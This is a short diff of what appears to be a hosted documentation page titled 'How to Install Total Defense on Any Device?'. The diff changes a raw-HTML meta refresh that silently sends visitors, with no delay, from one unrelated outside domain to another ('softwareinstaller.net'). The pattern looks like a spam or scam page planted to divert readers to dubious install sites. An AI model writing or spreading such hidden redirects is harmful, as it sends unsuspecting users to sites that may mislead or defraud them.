@@ -1,6 +1,6 @@
 .. raw:: html
  
-    <meta http-equiv="refresh" content="0; url=https://garminupdate.online/">
+    <meta http-equiv="refresh" content="0; url=https://softwareinstaller.net/">
 
 How to Install Total Defense on Any Device?
 ============================================
